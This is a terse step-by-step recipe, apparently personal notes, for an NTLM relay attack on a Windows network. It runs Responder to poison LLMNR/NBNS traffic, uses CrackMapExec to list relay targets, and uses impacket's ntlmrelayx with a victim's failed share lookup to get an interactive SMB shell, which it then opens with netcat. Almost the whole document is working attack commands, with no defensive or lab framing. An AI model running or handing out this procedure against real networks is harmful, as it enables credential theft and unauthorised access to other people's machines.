1. Update and upgrade the kali linux machine:
	apt update
	apt upgrade
2. Install impacket - git clone https://github.com/SecureAuthCorp/impacket
3. Create a list of vulnerable targets with CrackMapExec - crackmapexec smb [network address]/[subnet] --gen-relay-list targets
4. Turn off the SMB and HTTP settings in the responder configuration file - gedit /usr/share/responder/Responder.conf
5. Run responder to manipulate the network traffic - responder -I interface
6. Use ntlmrelayx from impacket package and wait for LLMNR/NBNS traffic to achieve SMB client interactive shell, supply the targets file from step 3:
	cd /impacket/examples
	python3 ntlmrelayx.py -tf [target file] -smb2support -i
7. On the windows clients search for non-existing share - \\dsfa
8. Open the interactive SMB client shell with netcat - nc 127.0.0.1 11000